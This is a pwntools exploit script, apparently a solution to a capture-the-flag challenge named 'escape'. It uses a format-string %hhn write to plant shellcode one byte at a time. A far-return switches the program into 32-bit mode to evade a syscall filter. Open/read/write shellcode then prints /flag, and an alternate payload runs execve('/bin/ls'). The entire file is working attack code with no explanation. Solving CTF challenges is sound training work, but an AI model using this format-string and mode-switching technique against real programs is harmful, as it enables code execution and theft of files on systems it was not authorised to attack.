from pwn import *
io = process("./escape")
#io = remote("escape.sstf.site",5051)

retfAddr = 0x50510110 # have to start at this addr, so that no least significant null bytes
orwAddr = 0x50510130

def write(addr,byte):
    if byte != 0:
        formatStr = b"%" + (str(byte).encode()).rjust(7,b"0") + b"c" + b"%10$hhn" + p64(addr)
    else:
        formatStr = b"%9$hhnAA" + p64(addr)
    io.sendlineafter("Enter:",formatStr)


# retf to 32 bit code
context.arch = "amd64"
retf = asm(
        """
        mov DWORD PTR [rsp+4], 0x23
        mov DWORD PTR [rsp], 0x50510130
        retf
        """)

context.clear()
context.update(arch="i386")

# need to make a new stack first
orw = asm(
       """
       mov esp,0x50510500
       mov eax,5 
       push 0x067
       push 0x616c662f
       mov ebx,esp
       xor ecx,ecx
       xor edx,edx
       int 0x80

       mov ebx,eax
       mov eax,3
       mov ecx,esp
       mov edx,0xff
       int 0x80

       mov eax,4
       mov ebx,1
       mov ecx,esp
       mov edx,0xff
       int 0x80
       """
        )

# execve("ls")
ls = asm(
       """
       mov esp,0x50510500
       mov eax,0xb 
       push 0x736c2f
       push 0x6e69622f
       mov ebx,esp
       xor ecx,ecx
       xor edx,edx
       int 0x80
       """
       )

for byte in retf:
    write(retfAddr,byte)
    retfAddr += 1

#for byte in ls:
#    write(orwAddr,byte)
#    orwAddr += 1

for byte in orw:
    write(orwAddr,byte)
    orwAddr += 1

#gdb.attach(io,gdbscript="break *0x50510110")

io.sendlineafter("Enter:","done")
io.interactive()
